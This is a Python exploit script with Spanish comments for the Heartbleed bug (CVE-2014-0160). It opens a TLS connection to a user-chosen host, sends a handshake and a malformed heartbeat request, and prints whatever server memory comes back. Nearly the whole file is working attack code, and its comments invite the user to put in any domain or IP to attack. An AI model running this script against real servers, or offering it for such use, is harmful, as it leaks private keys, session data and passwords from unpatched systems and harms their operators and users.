#!/usr/bin/python3

import struct
import socket
import sys
import time

# VARIABLES
host = '0.0.0.0' # Cambia esto por el dominio o ip que quieras atacar.
port = 443

# Mensaje de hello.
hello = bytes.fromhex('''
16 03 02 00  dc 01 00 00 d8 03 02 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01
''')

# Solicitud maliciosa.
heartbleed_request = bytes.fromhex('18 03 02 00 03 01 40 00')


# FUNCIONES
def envia_request_malicioso(socket):
    socket.send(heartbleed_request)
    hdr = socket.recv(5)
    if hdr:
        content_type, version, length = struct.unpack('>BHH', hdr)
        pay = socket.recv(length)
        if content_type == 24 and len(pay) > 3:
            print('WARNING: server returned more data than it should - server is vulnerable!')
            print(pay)
        elif content_type == 21:
            print('Received alert, server returned error, likely not vulnerable')
        else:
            print('No heartbeat response received, server likely not vulnerable')



# EXPLOIT
# Puedes omitir el banner si quieres.
try:
    from banner import *
    banner()
    print("CVE-2014-0160"+"\n")
    time.sleep(1)
except:
    pass

# Declara y ajusta el socket.
mi_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
mi_socket.connect((host, port))

# Enviar el mensaje de hello para establecer una conexiÃ³n.
mi_socket.send(hello)

# Recibir respuesta del hello
while True:
    hdr = mi_socket.recv(5)
    content_type, version, length = struct.unpack('>BHH', hdr)
    hand = mi_socket.recv(length)
    if content_type == 22 and hand and hand[0] == 0x0E:
        break

# Enviar solicitud de Heartbeat y comprobar la respuesta
envia_request_malicioso(mi_socket)
mi_socket.close()
